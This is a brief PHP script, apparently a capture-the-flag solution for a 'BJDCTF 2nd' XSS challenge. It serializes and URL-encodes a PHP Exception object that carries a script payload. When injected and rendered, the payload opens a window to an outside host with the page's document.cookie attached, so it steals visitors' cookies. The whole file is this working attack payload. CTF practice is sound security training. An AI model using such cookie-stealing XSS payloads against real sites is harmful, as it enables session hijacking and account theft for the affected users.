<?php
//「BJDCTF 2 nd」xss 之光
$poc = new Exception("<script>window.open('http://ecb5ce70-0f2d-4055-9dbc-88aa1bf8190f.node5.buuoj.cn:81//?'+document.cookie);</script>");
echo urlencode(serialize($poc));
?>